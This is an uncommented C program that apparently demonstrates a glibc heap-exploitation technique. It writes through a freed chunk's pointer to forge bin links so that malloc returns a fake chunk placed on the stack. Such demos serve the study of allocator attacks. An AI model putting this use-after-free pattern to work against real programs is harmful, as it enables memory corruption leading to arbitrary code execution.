#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>

int main()
{
	unsigned long *p0;
	p0=malloc(0x200);
	printf("p0 @ %p.\n",p0);
	malloc(0x10);
	free(p0);
	malloc(0x300);
	
	unsigned long fake0[4],fake1[4];
	printf("fake0 @ %p.\n",fake0);
	printf("fake1 @ %p.\n",fake1);
	fake0[2]=(unsigned long)(p0-2);	
	fake0[3]=(unsigned long)fake1;
	
	fake1[2]=(unsigned long)fake0;
	p0[1]=(unsigned long)fake0;
	
	printf("malloc0 @ %p.\n",malloc(0x200));
	printf("malloc1 @ %p.\n",malloc(0x200));
}
